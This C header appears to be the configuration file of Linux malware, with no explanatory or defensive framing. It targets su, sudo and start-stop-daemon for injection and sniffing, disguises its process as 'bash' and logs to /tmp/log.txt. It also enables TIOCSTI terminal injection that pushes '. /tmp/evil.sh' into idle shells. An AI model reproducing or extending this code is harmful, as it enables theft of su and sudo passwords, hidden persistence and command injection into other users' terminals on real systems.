#ifndef CONF_H
#define CONF_H 1

struct state_s;
typedef struct state_s state_t;

#define DEBUG 1
#define PID_MAX 4194304 /* TODO read in /proc/sys/kernel/pid_max */
#define TMPDIR "/tmp/"
#define HIDDEN_NAME "bash"
#define LOG_FILE "/tmp/log.txt"


#define INJECT_LIST { "/bin/su", "/usr/bin/sudo",  "/sbin/start-stop-daemon", NULL }
#define SNIFF_LIST { "/bin/su", "/usr/bin/sudo", NULL }
#define HANDLER_LIST { handle_su, handle_sudo, NULL }
#define BINARY_DIRS { "/bin", "/sbin", "/usr/bin", "/usr/sbin", "/usr/local/bin", "/usr/local/sbin", NULL }
#define SHELL_LIST { "(bash)", "(sh)", "(ksh)", "(tcsh)", "(zsh)", "(csh)", NULL }
#define MONITOR_MAX 64

#define READER_THREADS 16

void handle_su(state_t *st);
void handle_sudo(state_t *st);

#define ATTEMPT_TIOCSTI 1
#define PUSH_IDLE_TIME 5
#define PUSH_PAYLOAD ". /tmp/evil.sh"

#endif
